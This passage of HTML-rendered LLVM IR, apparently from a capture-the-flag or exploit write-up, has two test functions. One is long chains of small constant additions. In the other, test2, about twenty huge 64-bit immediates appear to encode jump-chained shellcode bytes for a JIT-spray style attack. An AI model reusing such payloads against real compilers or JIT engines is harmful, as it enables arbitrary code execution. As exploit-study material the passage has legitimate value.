= add nsw i64 %114, 256</span><br><span class="line">  %116 = add nsw i64 %115, 256</span><br><span class="line">  %117 = add nsw i64 %116, 256</span><br><span class="line">  %118 = add nsw i64 %117, 256</span><br><span class="line">  %119 = add nsw i64 %118, 256</span><br><span class="line">  %120 = add nsw i64 %119, 256</span><br><span class="line">  %121 = add nsw i64 %120, 256</span><br><span class="line">  %122 = add nsw i64 %121, 256</span><br><span class="line">  %123 = add nsw i64 %122, 256</span><br><span class="line">  %124 = add nsw i64 %123, 256</span><br><span class="line">  %125 = add nsw i64 %124, 256</span><br><span class="line">  %126 = add nsw i64 %125, 256</span><br><span class="line">  %127 = add nsw i64 %126, 256</span><br><span class="line">  %128 = add nsw i64 %127, 256</span><br><span class="line">  %129 = add nsw i64 %128, 256</span><br><span class="line">  %130 = add nsw i64 %129, 256</span><br><span class="line">  %131 = add nsw i64 %130, 256</span><br><span class="line">  %132 = add nsw i64 %131, 256</span><br><span class="line">  %133 = add nsw i64 %132, 256</span><br><span class="line">  %134 = add nsw i64 %133, 256</span><br><span class="line">  %135 = add nsw i64 %134, 256</span><br><span class="line">  %136 = add nsw i64 %135, 256</span><br><span class="line">  %137 = add nsw i64 %136, 256</span><br><span class="line">  %138 = add nsw i64 %137, 256</span><br><span class="line">  %139 = add nsw i64 %138, 256</span><br><span class="line">  %140 = add nsw i64 %139, 256</span><br><span class="line">  %141 = add nsw i64 %140, 256</span><br><span class="line">  %142 = add nsw i64 %141, 256</span><br><span class="line">  %143 = add nsw i64 %142, 256</span><br><span class="line">  %144 = add nsw i64 %143, 256</span><br><span class="line">  %145 = add nsw i64 %144, 256</span><br><span class="line">  %146 = add nsw i64 %145, 256</span><br><span class="line">  %147 = add nsw i64 %146, 256</span><br><span class="line">  %148 = add nsw i64 %147, 256</span><br><span class="line">  %149 = add nsw i64 %148, 256</span><br><span class="line">  %150 = add nsw i64 %149, 256</span><br><span class="line">  %151 = add nsw i64 %150, 256</span><br><span class="line">  %152 = add nsw i64 %151, 256</span><br><span class="line">  %153 = add nsw i64 %152, 256</span><br><span class="line">  %154 = add nsw i64 %153, 256</span><br><span class="line">  %155 = add nsw i64 %154, 256</span><br><span class="line">  %156 = add nsw i64 %155, 256</span><br><span class="line">  %157 = add nsw i64 %156, 256</span><br><span class="line">  %158 = add nsw i64 %157, 256</span><br><span class="line">  %159 = add nsw i64 %158, 256</span><br><span class="line">  %160 = add nsw i64 %159, 256</span><br><span class="line">  %161 = add nsw i64 %160, 256</span><br><span class="line">  %162 = add nsw i64 %161, 256</span><br><span class="line">  %163 = add nsw i64 %162, 256</span><br><span class="line">  %164 = add nsw i64 %163, 256</span><br><span class="line">  %165 = add nsw i64 %164, 256</span><br><span class="line">  %166 = add nsw i64 %165, 256</span><br><span class="line">  %167 = add nsw i64 %166, 256</span><br><span class="line">  %168 = add nsw i64 %167, 256</span><br><span class="line">  %169 = add nsw i64 %168, 256</span><br><span class="line">  %170 = add nsw i64 %169, 256</span><br><span class="line">  %171 = add nsw i64 %170, 256</span><br><span class="line">  %172 = add nsw i64 %171, 256</span><br><span class="line">  %173 = add nsw i64 %172, 256</span><br><span class="line">  %174 = add nsw i64 %173, 256</span><br><span class="line">  %175 = add nsw i64 %174, 256</span><br><span class="line">  %176 = add nsw i64 %175, 256</span><br><span class="line">  %177 = add nsw i64 %176, 256</span><br><span class="line">  %178 = add nsw i64 %177, 256</span><br><span class="line">  %179 = add nsw i64 %178, 256</span><br><span class="line">  %180 = add nsw i64 %179, 256</span><br><span class="line">  %181 = add nsw i64 %180, 256</span><br><span class="line">  %182 = add nsw i64 %181, 256</span><br><span class="line">  %183 = add nsw i64 %182, 256</span><br><span class="line">  %184 = add nsw i64 %183, 256</span><br><span class="line">  %185 = add nsw i64 %184, 256</span><br><span class="line">  %186 = add nsw i64 %185, 256</span><br><span class="line">  %187 = add nsw i64 %186, 256</span><br><span class="line">  %188 = add nsw i64 %187, 256</span><br><span class="line">  %189 = add nsw i64 %188, 256</span><br><span class="line">  %190 = add nsw i64 %189, 256</span><br><span class="line">  %191 = add nsw i64 %190, 256</span><br><span class="line">  %192 = add nsw i64 %191, 256</span><br><span class="line">  %193 = add nsw i64 %192, 256</span><br><span class="line">  %194 = add nsw i64 %193, 256</span><br><span class="line">  %195 = add nsw i64 %194, 256</span><br><span class="line">  %196 = add nsw i64 %195, 256</span><br><span class="line">  %197 = add nsw i64 %196, 256</span><br><span class="line">  %198 = add nsw i64 %197, 256</span><br><span class="line">  %199 = add nsw i64 %198, 256</span><br><span class="line">  %200 = add nsw i64 %199, 256</span><br><span class="line">  %201 = add nsw i64 %200, 256</span><br><span class="line">  %202 = add nsw i64 %201, 256</span><br><span class="line">  %203 = add nsw i64 %202, 256</span><br><span class="line">  %204 = add nsw i64 %203, 256</span><br><span class="line">  %205 = add nsw i64 %204, 256</span><br><span class="line">  %206 = add nsw i64 %205, 256</span><br><span class="line">  %207 = add nsw i64 %206, 256</span><br><span class="line">  %208 = add nsw i64 %207, 256</span><br><span class="line">  %209 = add nsw i64 %208, 256</span><br><span class="line">  %210 = add nsw i64 %209, 256</span><br><span class="line">  %211 = add nsw i64 %210, 256</span><br><span class="line">  %212 = add nsw i64 %211, 256</span><br><span class="line">  %213 = add nsw i64 %212, 256</span><br><span class="line">  %214 = add nsw i64 %213, 256</span><br><span class="line">  %215 = add nsw i64 %214, 256</span><br><span class="line">  %216 = add nsw i64 %215, 256</span><br><span class="line">  %217 = add nsw i64 %216, 256</span><br><span class="line">  %218 = add nsw i64 %217, 256</span><br><span class="line">  %219 = add nsw i64 %218, 256</span><br><span class="line">  %220 = add nsw i64 %219, 256</span><br><span class="line">  %221 = add nsw i64 %220, 256</span><br><span class="line">  %222 = add nsw i64 %221, 256</span><br><span class="line">  %223 = add nsw i64 %222, 256</span><br><span class="line">  %224 = add nsw i64 %223, 256</span><br><span class="line">  %225 = add nsw i64 %224, 256</span><br><span class="line">  %226 = add nsw i64 %225, 256</span><br><span class="line">  %227 = add nsw i64 %226, 256</span><br><span class="line">  %228 = add nsw i64 %227, 256</span><br><span class="line">  %229 = add nsw i64 %228, 256</span><br><span class="line">  %230 = add nsw i64 %229, 256</span><br><span class="line">  %231 = add nsw i64 %230, 256</span><br><span class="line">  %232 = add nsw i64 %231, 256</span><br><span class="line">  %233 = add nsw i64 %232, 256</span><br><span class="line">  %234 = add nsw i64 %233, 256</span><br><span class="line">  %235 = add nsw i64 %234, 256</span><br><span class="line">  %236 = add nsw i64 %235, 256</span><br><span class="line">  %237 = add nsw i64 %236, 256</span><br><span class="line">  %238 = add nsw i64 %237, 256</span><br><span class="line">  %239 = add nsw i64 %238, 256</span><br><span class="line">  %240 = add nsw i64 %239, 256</span><br><span class="line">  %241 = add nsw i64 %240, 256</span><br><span class="line">  %242 = add nsw i64 %241, 256</span><br><span class="line">  %243 = add nsw i64 %242, 256</span><br><span class="line">  %244 = add nsw i64 %243, 256</span><br><span class="line">  %245 = add nsw i64 %244, 256</span><br><span class="line">  %246 = add nsw i64 %245, 256</span><br><span class="line">  %247 = add nsw i64 %246, 256</span><br><span class="line">  %248 = add nsw i64 %247, 256</span><br><span class="line">  %249 = add nsw i64 %248, 256</span><br><span class="line">  %250 = add nsw i64 %249, 256</span><br><span class="line">  %251 = add nsw i64 %250, 256</span><br><span class="line">  %252 = add nsw i64 %251, 256</span><br><span class="line">  %253 = add nsw i64 %252, 256</span><br><span class="line">  %254 = add nsw i64 %253, 256</span><br><span class="line">  %255 = add nsw i64 %254, 256</span><br><span class="line">  %256 = add nsw i64 %255, 256</span><br><span class="line">  %257 = add nsw i64 %256, 256</span><br><span class="line">  %258 = add nsw i64 %257, 256</span><br><span class="line">  %259 = add nsw i64 %258, 256</span><br><span class="line">  %260 = add nsw i64 %259, 256</span><br><span class="line">  %261 = add nsw i64 %260, 256</span><br><span class="line">  %262 = add nsw i64 %261, 256</span><br><span class="line">  %263 = add nsw i64 %262, 256</span><br><span class="line">  %264 = add nsw i64 %263, 256</span><br><span class="line">  %265 = add nsw i64 %264, 256</span><br><span class="line">  %266 = add nsw i64 %265, 256</span><br><span class="line">  %267 = add nsw i64 %266, 256</span><br><span class="line">  %268 = add nsw i64 %267, 256</span><br><span class="line">  %269 = add nsw i64 %268, 256</span><br><span class="line">  %270 = add nsw i64 %269, 256</span><br><span class="line">  %271 = add nsw i64 %270, 256</span><br><span class="line">  %272 = add nsw i64 %271, 256</span><br><span class="line">  %273 = add nsw i64 %272, 256</span><br><span class="line">  %274 = add nsw i64 %273, 256</span><br><span class="line">  %275 = add nsw i64 %274, 256</span><br><span class="line">  %276 = add nsw i64 %275, 256</span><br><span class="line">  %277 = add nsw i64 %276, 256</span><br><span class="line">  %278 = add nsw i64 %277, 256</span><br><span class="line">  %279 = add nsw i64 %278, 256</span><br><span class="line">  %280 = add nsw i64 %279, 256</span><br><span class="line">  %281 = add nsw i64 %280, 256</span><br><span class="line">  %282 = add nsw i64 %281, 256</span><br><span class="line">  %283 = add nsw i64 %282, 256</span><br><span class="line">  %284 = add nsw i64 %283, 256</span><br><span class="line">  %285 = add nsw i64 %284, 256</span><br><span class="line">  %286 = add nsw i64 %285, 256</span><br><span class="line">  %287 = add nsw i64 %286, 256</span><br><span class="line">  %288 = add nsw i64 %287, 256</span><br><span class="line">  %289 = add nsw i64 %288, 256</span><br><span class="line">  %290 = add nsw i64 %289, 256</span><br><span class="line">  %291 = add nsw i64 %290, 256</span><br><span class="line">  %292 = add nsw i64 %291, 256</span><br><span class="line">  %293 = add nsw i64 %292, 256</span><br><span class="line">  %294 = add nsw i64 %293, 256</span><br><span class="line">  %295 = add nsw i64 %294, 256</span><br><span class="line">  %296 = add nsw i64 %295, 256</span><br><span class="line">  %297 = add nsw i64 %296, 256</span><br><span class="line">  %298 = add nsw i64 %297, 256</span><br><span class="line">  %299 = add nsw i64 %298, 256</span><br><span class="line">  %300 = add nsw i64 %299, 256</span><br><span class="line">  %301 = add nsw i64 %300, 256</span><br><span class="line">  %302 = add nsw i64 %301, 256</span><br><span class="line">  %303 = add nsw i64 %302, 256</span><br><span class="line">  %304 = add nsw i64 %303, 256</span><br><span class="line">  %305 = add nsw i64 %304, 256</span><br><span class="line">  %306 = add nsw i64 %305, 256</span><br><span class="line">  %307 = add nsw i64 %306, 256</span><br><span class="line">  %308 = add nsw i64 %307, 256</span><br><span class="line">  %309 = add nsw i64 %308, 256</span><br><span class="line">  %310 = add nsw i64 %309, 256</span><br><span class="line">  %311 = add nsw i64 %310, 256</span><br><span class="line">  %312 = add nsw i64 %311, 256</span><br><span class="line">  %313 = add nsw i64 %312, 256</span><br><span class="line">  %314 = add nsw i64 %313, 1</span><br><span class="line">  %315 = add nsw i64 %314, 1</span><br><span class="line">  %316 = add nsw i64 %315, 1</span><br><span class="line">  %317 = add nsw i64 %316, 256</span><br><span class="line">  ret i64 %317</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define dso_local i64 @test2(i64 %0) #0 &#123;</span><br><span class="line">  %2 = sub nsw i64 %0, 1</span><br><span class="line">  %3 = add nsw i64 %2, 1</span><br><span class="line">  %4 = add nsw i64 %3, 1</span><br><span class="line">  %5 = add nsw i64 %4, 16999840169015142506</span><br><span class="line">  %6 = add nsw i64 %5, 16999840042827329464</span><br><span class="line">  %7 = add nsw i64 %6, 16999840167141359944</span><br><span class="line">  %8 = add nsw i64 %7, 16999802617337939272</span><br><span class="line">  %9 = add nsw i64 %8, 16999840169015152720</span><br><span class="line">  %10 = add nsw i64 %9, 16999840169020852552</span><br><span class="line">  %11 = add nsw i64 %10, 16999839548121314152</span><br><span class="line">  %12 = add nsw i64 %11, 16999840169015178801</span><br><span class="line">  %13 = add nsw i64 %12, 16999840169015152726</span><br><span class="line">  %14 = add nsw i64 %13, 16999840169015117930</span><br><span class="line">  %15 = add nsw i64 %14, 16999840169015152734</span><br><span class="line">  %16 = add nsw i64 %15, 16999840169020752200</span><br><span class="line">  %17 = add nsw i64 %16, 16999840169015152726</span><br><span class="line">  %18 = add nsw i64 %17, 16999840169020787016</span><br><span class="line">  %19 = add nsw i64 %18, 16999840169015169585</span><br><span class="line">  %20 = add nsw i64 %19, 16999840169015130986</span><br><span class="line">  %21 = add nsw i64 %20, 16999840169015152728</span><br><span class="line">  %22 = add nsw i64 %21, 16999840169015117071</span><br><span class="line">  %23 = add nsw i64 %22, 256</span><br><span class="line">  %24 = add nsw i64 %23, 256</span><br><span class="line">  %25 = add nsw i64 %24, 256</span><br><span class="line">  %26 = add nsw i64 %25, 256</span><br><span class="line">  %27 = add nsw i64 %26, 256</span><br><span class="line">  %28 = add nsw i64 %27, 256</span><br><span class="line">  %29 = add nsw i64 %28, 256</span><br><span class="line">  %30 = add nsw i64 %29, 256</span><br><span class="line">  %31 = add nsw i64 %30, 256</span><br><span class="line">  %32 = add nsw i64 %31, 256</span><br><span class="line">  %33 = add nsw i64 %32, 256</span><br><span class="line">  %34 = add nsw i64 %33, 256</span><br><span class="line">  %35 = add nsw i64 %34, 256</span><br><span class="line">  %36 = add nsw i64 %35, 256</span><br><span class="line">  %37 = add nsw i64 %36, 256</span><br><span class="line">  %38 = add nsw i64 %37, 256</span><br><span class="line">  %39 = add nsw i64 %38, 256</span><br><span class="line">  %40 = add nsw i64 %39, 256</span><br><span class="line">  %41 = add nsw i64 %40, 256</span><br><span class="line">  %42 = add nsw i64 %41, 256</span><br><span class="line">  %43 = add nsw i64 %42, 256</span><br><span class="line">  %44 = add nsw i64 %43, 256</span><br><span class="line">  %45 = add nsw i64 %44, 256</span><br><span class="line">  %46 = add nsw i64 %45, 256</span><br><span class="line">  %47 = add nsw i64 %46, 256</span><br><span class="line">  %48 = add nsw i64 %47, 256</span><br><span class="line">  %49 = add nsw i64 %48, 256</span><br><span class="line">  %50 = add nsw i64 %49, 256</span><br><span class="line">  %51 = add nsw i64 %50, 256</span><br><span class="line">  %52 = add nsw i64 %51, 256</span><br><span class="line">  %53 = add nsw i64 %52, 256</span><br><span class="line">  %54 = add nsw i64 %53, 256</span><br><span class="line">  %55 = add nsw i64 %54, 256</span><br><span class="line">  %56 = add nsw i64 %55, 256</span><br><span class="line">  %57 = add nsw i64 %56, 256</span><br><span class="line">  %58 = add nsw i64 %57, 256</span><br><span class="line">  %59 = add nsw i64 %58, 256</span><br><span class="line">  %60 = add nsw i64 %59, 256</span><br><span class="line">  %61 = add nsw i64 %60, 256</span><br><span class="line">  %62 = add nsw i64 %61, 256</span><br><span class="line">  %63 = add nsw i64 %62, 256</span><br><span class="line">  %64 = add nsw i64 %63, 256</span><br><span class="line">  %65 = add nsw i64 %64, 256</span><br><span class="line">  %66 = add nsw i64 %65, 256</span><br><span class="line">  %67 = add nsw i64 %66, 256</span><br><span class="line">  %68 = add nsw i64 %67, 256</span><br><span class="line">  %69 = add nsw i64 %68, 256</span><br><span class="line">  %70 = add nsw i64 %69, 256</span><br><span class="line">  %71 = add nsw i64 %70, 256</span><br><span class="line">  %72 = add nsw i64 %71, 256</span><br><span class="line">  %73 = add nsw i64 %72, 256</span><br><span class="line">  %74 = add nsw i64 %73, 256</span><br><span class="line">  %75 = add nsw i64 %74, 256</span><br><span class="line">  %76 = add nsw i64 %75, 256</span><br><span class="line">  %77 = add nsw i64 %76, 256</span><br><span class="line">  %78 = add nsw i64 %77, 256</span><br><span class="line">  %79 = add nsw i64 %78, 256</span><br><span class="line">  %80 = add nsw i64 %79, 256</span><br><span class="line">  %81 = add nsw i64 %80, 256</span><br><span class="line">  %82 = add nsw i64 %81, 256</span><br><span class="line">  %83 = add nsw i64 %82, 256</span><br><span class="line">  %84 = add nsw i64 %83, 256</span><br><span class="line">  %85 = add nsw i64 %84, 256</span><br><span class="line">  %86 = add nsw i64 %85, 256</span><br><span class="line">  %87 = add nsw i64 %86, 256</span><br><span class="line">  %88 = add nsw i64 %87, 256</span><br><span class="line">  %89 = add nsw i64 %88, 256</span><br><span class="line">  %90 = add nsw i64 %89, 256</span><br><span class="line">  %91 = add nsw i64 %90, 256</span><br><span class="line">  %92 = add nsw i64 %91, 256</span><br><span class="line">  %93 = add nsw i64 %92, 256</span><br><span class="line">  %94 = add nsw i64 %93, 256</span><br><span class="line">  %95 = add nsw i64 %94, 256</span><br><span class="line">  %96 = add nsw i64 %95, 256</span><br><span class="line">  %97 = add nsw i64 %96, 256</span><br><span class="line">  %98 = add nsw i64 %97, 256</span><br><span class="line">  %99 = add nsw i64 %98, 256</span><br><span class="line">  %100 = add nsw i64 %99, 256</span><br><span class="line">  %101 = add nsw i64 %100, 256</span><br><span class="line">  %102 = add nsw i64 %101, 256</span><br><span class="line">  %103 = add nsw i64 %102, 256</span><br><span class="line">  %104 = add nsw i64 %103, 256</span><br><span class="line">  %105 = add nsw i64 %104, 256</span><br><span class="line">  %106 = add nsw i64 %105, 256</span><br><span class="line">  %107 = add nsw i64 %106, 256</span><br><span class="line">  %108 = add nsw i64 %107, 256</span><br><span class="line">  %109 = add nsw i64 %108, 256</span><br><span class="line">  %110 = add nsw i64 %109, 256</span><br><span class="line">  %111 = add nsw i64 %110, 256</span><br><span class="line">  %112 = add nsw i64 %111, 256</span><br><span class="line">  %113 = add nsw i64 %112, 256</span><br><span class="line">  %114 = add nsw i64 %113, 256</span><br><span class="line">  %115 = add nsw i64 %114, 256</span><br><span class="line">  %116 = add nsw i64 %115, 256</span><br><span class="line">  %117 = add nsw i64 %116, 256</span><br><span class="line">  %118 = add nsw i64 %117, 256</span><br><span class="line">  %119 = add nsw i64 %118, 256</span><br><span class="line">  %120 = add nsw i64 %119, 256</span><br><span class="line">  %121 = add nsw i64 %120, 256</span><br><span class="line">  %122 = add nsw i64 %121, 256</span><br><span class="line">  %123 = add nsw i64 %122, 256</span><br><span class="line">  %124 = add nsw i64 %123, 256</span><br><span class="line">  %125 = add nsw i64 %124, 256</span><br><span class="line">  %126 = add nsw i64 %125, 256</span><br><span class="line">  %127 = add nsw i64 %126, 256</span><br><span class="line">  %128 = add nsw i64 %127, 256</span><br><span class="line">  %129 = add nsw i64 %128, 256</span><br><span class="line">  %130 = add nsw i64 %129, 256</span><br><span class="line">  %131 = add nsw i64 %130, 256</span><br><span class="line">  %132 = add nsw i64 %131, 256</span><br><span class="line">  %133 = add nsw i64 %132, 256</span><br><span class="line">  %134 = add nsw i64 %133, 256</span><br><span class="line">  %135 = add nsw i64 %134, 256</span><br><span class="line">  %136 = add nsw i64 %135, 256</span><br><span class="line">  %137 = add nsw i64 %136, 256</span><br><span class="line">  %138 = add nsw i64 %137, 256</span><br><span class="line">  %139 = add nsw i64 %138, 256</span><br><span class="line">  %140 = add nsw i64 %139, 256</span><br><span class="line">  %141 = add nsw i64 %140, 256</span><br><span class="line">  %142 = add nsw i64 %141, 256</span><br><span class="line">  %143 = add nsw i64 %142, 256</span><br><span class="line">  %144 = add nsw i64 %143, 256</span><br><span class="line">  %145 = add nsw i64 %144, 256</span><br><span class="line">  %146 = add nsw i64 %145, 256</span><br><span class="line">  %147 = add nsw i64 %146, 256</span><br><span class="line">  %148 = add nsw i64 %147, 256</span><br><span class="line">  %149 = add nsw i64 %148, 256</span><br><span class="line">  %150 = add nsw i64 %149, 256</span><br><span class="line">  %151 = add nsw i64 %150, 256</span><br><span class="line">  %152 = add nsw i64 %151, 256</span><br><span class="line">  %153 = add nsw i64 %152, 256</span><br><span class="line">  %154 = add nsw i64 %153, 256</span><br><span class="line">  %155 = add nsw i64 %154, 256</span><br><span class="line">  %156 = add nsw i64 %155, 256</span><br><span class="line">  %157 = add nsw i64 %156, 256</span><br><span class="line">  %158 = add nsw i64 %157, 256</span><br><span class="line">  %159 = add nsw i64 %158, 256</span><br><span class="line">  %160 = add nsw i64 %159, 256</span><br><span class="line">  %161 = add nsw i64 %160, 256</span><br><span class="line">  %162 = add nsw i64 %161, 256</span><br><span class="line">  %163 = add nsw i64 %162, 256</span><br><span class="line">  %164 = add nsw i64 %163, 256</span><br><span class="line">  %165 = add nsw i64 %164, 256</span><br><span class="line">  %166 = add nsw i64 %165, 256</span><br><span class="line">  %167 = add nsw i64 %166, 256</span><br><span class="line">  %168 = add nsw i64 %167, 256</span><br><span class="line">  %169 = add nsw i64 %168, 256</span><br><span class="line">  %170 = add nsw i64 %169, 256</span><br><span class="line">  %171 = add nsw i64 %170, 256</span><br><span class="line">  %172 = add nsw i64 %171, 256</span><br><span class="line">  %173 = add nsw i64 %172, 256</span><br><span class="line">  %174 = add nsw i64 %173, 256</span><br><span class="line">  %175 = add nsw i64 %174, 256</span><br><span class="line">  %176 = add nsw i64 %175, 256</span><br><span class="line">  %177 = add nsw i64 %176, 256</span><br><span class="line">  %178 = add nsw i64 %177, 256</span><br><span class="line">  %179 = add nsw i64 %178, 256</span><br><span class="line">  %180 = add nsw i64 %179, 256</span><br><span class="line">  %181 = add nsw i64 %180, 256</span><br><span class="line">  %182 = add nsw i64 %181, 256</span><br><span class="line">  %183 = add nsw i64 %182, 256</span><br><span class="line">  %184 = add nsw i64 %183, 256</span><br><span class="line">  %185 = add nsw i64 %184, 256</span><br><span class="line">  %186 = add nsw i64 %185, 256</span><br><span class="line">  %187 = add nsw i64 %186, 256</span><br><span class="line">  %188 = add nsw i64 %187, 256</span><br><span class="line">  %189 = add nsw i64 %188, 256</span><br><span class="line">  %190 = add nsw i64 %189, 256</span><br><span class="line">  %191 = add nsw i64 %190, 256</span><br><span class="line">  %192 = add nsw i64 %191, 256</span><br><span class="line">  %193 = add nsw i64 %192, 256</span><br><span class="line">  %194 = add nsw i64 %193, 256</span><br><span class="line">  %195 = add nsw i64 %194, 256</span><br><span class="line">  %196 = add nsw i64 %195, 256</span><br><span class="line">  %197 = add nsw i64 %196, 256</span><br><span class="line">  %198 = add nsw i64 %197, 256</span><br><span class="line">  %199 = add nsw i64 %198, 256</span><br><span class="line">  %200 = add nsw i64 %199, 256</span><br><span class="line">  %201 = add nsw i64 %200, 256</span><br><span class="line">  %202 = add nsw i64 %201, 256</span><br><span class="line">  %203 = add nsw i64 %202, 256</span><br><span class="line">  %204 = add nsw i64 %203, 256</span><br><span class="line">  %205 = add nsw i64 %204, 256</span><br><span class="line">  %206 = add nsw i64 %205, 256</span><br><span class="line">  %207 = add nsw i64 %206, 256</span><br><span class="line">  %208 = add nsw i64 %207, 256</span><br><span class="line">  %209 = add nsw i64 %208, 256</span><br><span class="line">  %210 = add nsw i64 %209, 256</span><br><span class="line">  %211 = add nsw i64 %210, 256</span><br><span class="line">  %212 = add nsw i64 %211, 256</span><br><span class="line">  %213 = add nsw i64 %212, 256</span><br><span class="line">  %214 = add nsw i64 %213, 256</span><br><span class="line">  %215 = add nsw i64 %214, 256</span><br><span class="line">  %216 = add nsw i64 %215, 256</span><br><span class="line">  %217 = add nsw i64 %216, 256</span><br><span class="line">  %218 = add nsw i64 %217, 256</span><br><span class="line">  %219 = add nsw i64 %218, 256</span><br><span class="line">  %220 = add nsw i64 %219, 256</span><br><span class="line">  %221 = add nsw i64 %220, 256</span><br><span class="line">  %222 = add nsw i64 %221, 256</span><br><span class="line">  %223 = add nsw i64 %222, 256</span><br><span class="line">  %224 = add nsw i64 %223, 256</span><br><span class="line">  %225 = add nsw i64 %224, 256</span><br><span class="line">  %226 = add nsw i64 %225, 256</span><br><span class="line">  %227 = add nsw i64 %226, 256</span><br><span class="line">  %228 = add nsw i64 %227, 256</span><br><span class="line">  %229 = add nsw i64 %228, 256</span><br><span class="line">  %230 = add nsw i64 %229, 256</span><br><span class="line">  %231 = add nsw i64 %230, 256</span><br><span class="line">  %232 = add nsw i64 %231, 256</span><br><span class="line">  %233 = add nsw i64 %232, 256</span><br><span class="line">  %234 = add nsw i64 %233, 256</span><br><span class="line">  %235 = add nsw i64 %234, 256</span><br><span class="line">  %236 = add nsw i64 %235, 256</span><br><span class="line">  %237 = add nsw i64 %236, 256</span><br><span class="line">  %238 = add nsw i64 %237, 256</span><br><span class="line">  %239 = add nsw i64 %238, 256</span><br><span class="line">  %240 = add nsw i64 %239, 256</span><br><span class="line">  %241 = add nsw i64 %240, 256</span><br><span class="line">  %242 = add nsw i64 %241, 256</span><br><span class="line">  %243 = add nsw i64 %242, 256</span><br><span class="line">  %244 = add nsw i64 %243, 256</span><br><span class="line">  %245 = add nsw i64 %244, 256</span><br><span class="line">  %246 = add nsw i64 %245, 256</span><br><span class="line">  %247 = add nsw i64 %246, 256</span><br><span class="line">  %248 = add nsw i64 %247, 256</span><br><span class="line">  %249 = add nsw i64 %248, 256</span><br><span class="line">  %250 = add nsw i64 %249, 256</span><br><span class="line">  %251 = add nsw i64 %250, 256</span><br><span class="line">  %252 = add nsw i64 %251, 256</span><br><span class="line">  %253 = add nsw i64 %252, 256</span><br><span class="line">  %254 = add nsw i64 %253, 256</span><br><span class="line">  %255 = add nsw i64 %254, 256</span><br><span class="line">  %256 = add nsw i64 %255, 256</span><br><span class="line">  %257 = add nsw i64 %256, 256</span><br><span class="line">  %258 = add nsw i64 %257, 256</span><br><span class="line">  %259 = add nsw i64 %258, 256</span><br><span class="line">  %260 = add nsw i64 %259, 256</span><br><span class="line">  %261 = add nsw i64 %260, 256</span><br><span class="line">  %262 = add nsw i64 %261, 256</span><br><span class="line">  %263 = add nsw i64 %262, 256</span><br><span class="line">  %264 = add nsw i64 %263, 256</span><br><span class="line">  %265 = add nsw i64 %264, 256</span><br><span class="line">  %266 = add nsw i64 %265, 256</span><br><span class="line">  %267 = add nsw i64 %266, 256</span><br><span class="line">  %268 = add nsw i64 %267, 256</span><br><span class="line">  %269 = add nsw i64 %268, 256</span><br><span class="line">  %270 = add nsw i64 %269, 256</span><br><span class="line">  %271 = add nsw i64 %270, 256</span><br><span class="line">  %272 = add nsw i64 %271, 256</span><br><span class="line">  %273 = add nsw i64 %272, 256</span><br><span class="line">  %274 = add nsw i64 %273, 256</span><br><span class="line">  %275 = add nsw i64 %274, 256</span><br><span class="line">  %276 = add nsw i64 %275, 256</span><br><span class="line">  %277 = add nsw i64 %276, 256</span><br><span class="line">  %278 = add nsw i64 %277, 256</span><br><span class="line">  %279 = add nsw i64 %278, 256</span><br><span class="line">  %280 = add nsw i64 %279, 256</span><br><span class="line">  %281 = add nsw i64 %280, 256</span><br><span class="line">  %282 = add nsw i64 %281, 256</span><br><span class="line">  %283 = add nsw i64 %282, 256</span><br><span class="line">  %284 = add nsw i64 %283, 256</span><br><span class="line">  %285 = add nsw i64 %284, 256</span><br><span class="line">  %286 = add nsw i64 %285, 256</span><br><span class="line">  %287 = add nsw i64 %286, 256</span><br><span class="line">  %288 = add nsw i64 %287, 256</span><br><span class="line">  %289 = add nsw i64 %288, 256</span><br><span class="line">  %290 = add nsw i64 %289, 256</span><br><span class="line">  %291 = add nsw i64 %290, 256</span><br><span class="line">  %292 = add nsw i64 %291, 256</span><br><span class="line">  %293 = add nsw i64 %292, 256</span><br><span class="line">  %294 = add nsw i64 %293, 256</span><br><span class="line">  %295 = add nsw i64 %294, 256</span><br><span class="line">  %296 = add nsw i64 %295, 256</span><br><span class="line">  %297 = add nsw i64 %296, 256</span><br><span class="line">  %298 = add nsw i64 %297, 256</span><br><span class="line">  %299 = add nsw i64 %298, 256</span><br><span class="line">  %300 = add nsw i64 %299, 256</span><br><span class="line">  %301 = add nsw i64 %300, 256</span><br><span class="line">  %302 = add nsw i64 %301, 256</span><br><span class="line">  %303 = add nsw i64 %302, 256</span><br><span class="line">  %304 = add nsw i64 %303, 256</span><br><span class="line">  %305 = add nsw i64 %304, 256</span><br><span class="line">  %306 = add nsw i64 %305, 256</span><br><span class="line">  %307 = add nsw i64 %306, 256</span><br><span class="line">  %308 = add nsw i64 %307, 256</span><br><span class="line">  %309 = add nsw i64 %308, 256</span><br><span class="line">  %310 = add nsw i64 %309, 256</span><br><span class="line">  %311 = add nsw i64 %310, 256</span><br><span class="line">  %312 = add nsw i64 %311, 256</span><br><span class="line">  %313 = add nsw i64 %312, 256</span><br><span class="line">  %314 = add nsw i64 %313, 1</span><br><span class="line">  %315 = add nsw i64 %314, 1</span><br><span class="line">  %316 = add nsw i64 %315, 1</span><br><span class="line">  %317 = add nsw i64 %316, 256</span><br><span class="line">  %318 = add nsw i64 %317, 256</span><br><span class="line">  %319 = add nsw i64 %318, 256</span><br><span class="line">  ret i64 %319</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;Ubuntu clang version 12.0.0-3ubuntu1~20.04.5&quot;&#125;</span><br></pre></td></tr></table></figure>
